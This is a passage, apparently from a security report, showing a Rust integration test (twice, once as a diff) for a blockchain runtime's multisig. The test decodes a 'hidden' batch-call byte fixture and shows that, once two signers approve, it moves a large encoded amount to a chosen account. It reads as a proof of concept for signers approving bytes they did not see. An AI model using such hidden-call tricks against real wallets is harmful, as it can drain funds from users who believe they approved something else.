+#[cfg(test)]
+mod tests {
+	use crate::common::TestCommons;
+	use codec::{Decode, Encode};
+	use frame_support::{assert_ok, traits::Currency};
+	use pallet_multisig::{BoundedCallOf, ProposalStatus};
+	use quantus_runtime::{
+		AccountId, Balance, Balances, Multisig, Runtime, RuntimeCall, RuntimeOrigin, System, UNIT,
+	};
+	use sp_core::crypto::AccountId32;
+	use sp_runtime::MultiAddress;
+
+	const C74_BATCH_CALL_HEX: &str =
+		"090004020000bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb0f40cef630448203";
+	const TRANSFER_AMOUNT: Balance = 987_654_321_000_000;
+
+	fn account(id: u8) -> AccountId32 {
+		TestCommons::account_id(id)
+	}
+
+	fn decode_hex(value: &str) -> Vec<u8> {
+		assert_eq!(value.len() % 2, 0, "fixture hex must have complete bytes");
+		(0..value.len())
+			.step_by(2)
+			.map(|index| {
+				u8::from_str_radix(&value[index..index + 2], 16)
+					.expect("fixture must contain hexadecimal ASCII")
+			})
+			.collect()
+	}
+
+	#[test]
+	fn exact_hidden_batch_bytes_reach_threshold_and_move_the_encoded_amount() {
+		TestCommons::new_test_ext().execute_with(|| {
+			System::set_block_number(1);
+
+			let signer_a = account(1);
+			let signer_b = account(2);
+			let signers = vec![signer_a.clone(), signer_b.clone()];
+			let destination = AccountId::new([0xbb; 32]);
+			let call_bytes = decode_hex(C74_BATCH_CALL_HEX);
+
+			// Decode the shared Flutter fixture under the frozen runtime and pin its
+			// exact semantic shape as well as its serialized bytes.
+			let mut input = &call_bytes[..];
+			let decoded = RuntimeCall::decode(&mut input).expect("fixture must decode");
+			assert!(input.is_empty(), "fixture must have no trailing bytes");
+			let expected = RuntimeCall::Utility(pallet_utility::Call::batch {
+				calls: vec![RuntimeCall::Balances(pallet_balances::Call::transfer_allow_death {
+					dest: MultiAddress::Id(destination.clone()),
+					value: TRANSFER_AMOUNT,
+				})],
+			});
+			assert_eq!(decoded.encode(), expected.encode());
+			assert_eq!(decoded.encode(), call_bytes);
+
+			assert_ok!(Multisig::create_multisig(
+				RuntimeOrigin::signed(signer_a.clone()),
+				signers.clone(),
+				2,
+				0,
+			));
+			let multisig = Multisig::derive_multisig_address(&signers, 2, 0);
+			Balances::make_free_balance_be(&multisig, 1000 * UNIT);
+
+			let multisig_before = Balances::free_balance(&multisig);
+			let destination_before = Balances::free_balance(&destination);
+			let bounded: BoundedCallOf<Runtime> =
+				call_bytes.clone().try_into().expect("fixture must fit MaxCallSize");
+
+			// The proposing signer supplies approval one, but cannot dispatch the
+			// stored call before a second signer confirms the exact same bytes.
+			assert_ok!(Multisig::propose(
+				RuntimeOrigin::signed(signer_a.clone()),
+				multisig.clone(),
+				bounded.clone(),
+				100,
+			));
+			let proposed = pallet_multisig::Proposals::<Runtime>::get(&multisig, 0)
+				.expect("proposal must be stored");
+			assert_eq!(proposed.call.as_slice(), call_bytes.as_slice());
+			assert_eq!(proposed.status, ProposalStatus::Active);
+			assert_eq!(proposed.approvals.as_slice(), &[signer_a.clone()]);
+			assert_eq!(Balances::free_balance(&destination), destination_before);
+
+			assert_ok!(Multisig::approve(
+				RuntimeOrigin::signed(signer_b.clone()),
+				multisig.clone(),
+				0,
+				bounded,
+			));
+			let approved = pallet_multisig::Proposals::<Runtime>::get(&multisig, 0)
+				.expect("approved proposal must remain until execution");
+			assert_eq!(approved.status, ProposalStatus::Approved);
+			assert_eq!(approved.approvals.as_slice(), &[signer_a.clone(), signer_b.clone()]);
+
+			assert_ok!(Multisig::execute(RuntimeOrigin::signed(signer_b), multisig.clone(), 0,));
+
+			assert_eq!(Balances::free_balance(&destination), destination_before + TRANSFER_AMOUNT,);
+			assert_eq!(Balances::free_balance(&multisig), multisig_before - TRANSFER_AMOUNT,);
+			assert!(pallet_multisig::Proposals::<Runtime>::get(&multisig, 0).is_none());
+		});
+	}
+}
```

</details>

<details>

<summary><code>runtime_test.rs</code></summary>

```rs
//! Local C74 integration fixture.
//!
//! The byte string below is also asserted by the frozen Flutter widget test.
//! This runtime-side layer proves what those exact, correctly decoded bytes do
//! after an ordinary 2-of-2 multisig reaches its configured threshold.

#[cfg(test)]
mod tests {
	use crate::common::TestCommons;
	use codec::{Decode, Encode};
	use frame_support::{assert_ok, traits::Currency};
	use pallet_multisig::{BoundedCallOf, ProposalStatus};
	use quantus_runtime::{
		AccountId, Balance, Balances, Multisig, Runtime, RuntimeCall, RuntimeOrigin, System, UNIT,
	};
	use sp_core::crypto::AccountId32;
	use sp_runtime::MultiAddress;

	const C74_BATCH_CALL_HEX: &str =
		"090004020000bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb0f40cef630448203";
	const TRANSFER_AMOUNT: Balance = 987_654_321_000_000;

	fn account(id: u8) -> AccountId32 {
		TestCommons::account_id(id)
	}

	fn decode_hex(value: &str) -> Vec<u8> {
		assert_eq!(value.len() % 2, 0, "fixture hex must have complete bytes");
		(0..value.len())
			.step_by(2)
			.map(|index| {
				u8::from_str_radix(&value[index..index + 2], 16)
					.expect("fixture must contain hexadecimal ASCII")
			})
			.collect()
	}

	#[test]
	fn exact_hidden_batch_bytes_reach_threshold_and_move_the_encoded_amount() {
		TestCommons::new_test_ext().execute_with(|| {
			System::set_block_number(1);

			let signer_a = account(1);
			let signer_b = account(2);
			let signers = vec![signer_a.clone(), signer_b.clone()];
			let destination = AccountId::new([0xbb; 32]);
			let call_bytes = decode_hex(C74_BATCH_CALL_HEX);

			// Decode the shared Flutter fixture under the frozen runtime and pin its
			// exact semantic shape as well as its serialized bytes.
			let mut input = &call_bytes[..];
			let decoded = RuntimeCall::decode(&mut input).expect("fixture must decode");
			assert!(input.is_empty(), "fixture must have no trailing bytes");
			let expected = RuntimeCall::Utility(pallet_utility::Call::batch {
				calls: vec![RuntimeCall::Balances(pallet_balances::Call::transfer_allow_death {
					dest: MultiAddress::Id(destination.clone()),
					value: TRANSFER_AMOUNT,
				})],
			});
			assert_eq!(decoded.encode(), expected.encode());
			assert_eq!(decoded.encode(), call_bytes);

			assert_ok!(Multisig::create_multisig(
				RuntimeOrigin::signed(signer_a.clone()),
				signers.clone(),
				2,
				0,
			));
			let multisig = Multisig::derive_multisig_address(&signers, 2, 0);
			Balances::make_free_balance_be(&multisig, 1000 * UNIT);

			let multisig_before = Balances::free_balance(&multisig);
			let destination_before = Balances::free_balance(&destination);
			let bounded: BoundedCallOf<Runtime> =
				call_bytes.clone().try_into().expect("fixture must fit MaxCallSize");

			// The proposing signer supplies approval one, but cannot dispatch the
			// stored call before a second signer confirms the exact same bytes.
			assert_ok!(Multisig::propose(
				RuntimeOrigin::signed(signer_a.clone()),
				multisig.clone(),
				bounded.clone(),
				100,
			));
			let proposed = pallet_multisig::Proposals::<Runtime>::get(&multisig, 0)
				.expect("proposal must be stored");
			assert_eq!(proposed.call.as_slice(), call_bytes.as_slice());
			assert_eq!(proposed.status, ProposalStatus::Active);
			assert_eq!(proposed.approvals.as_slice(), &[signer_a.clone()]);
			assert_eq!(Balances::free_balance(&destination), destination_before);

			assert_ok!(Multisig::approve(
				RuntimeOrigin::signed(signer_b.clone()),
				multisig.clone(),
				0,
				bounded,
			));
			let approved = pallet_multisig::Proposals::<Runtime>::get(&multisig, 0)
				.expect("approved proposal must remain until execution");
			assert_eq!(approved.status, ProposalStatus::Approved);
			assert_eq!(approved.approvals.as_slice(), &[signer_a.clone(), signer_b.clone()]);

			assert_ok!(Multisig::execute(RuntimeOrigin::signed(signer_b), multisig.clone(), 0,));

			assert_eq!(Balances::free_balance(&destination), destination_before + TRANSFER_AMOUNT,);
			assert_eq!(Balances::free_balance(&multisig), multisig_before - TRANSFER_AMOUNT,);
			assert!(pallet_multisig::Proposals::<Runtime>::get(&multisig, 0).is_none());
		});
	}
}
```

</details>
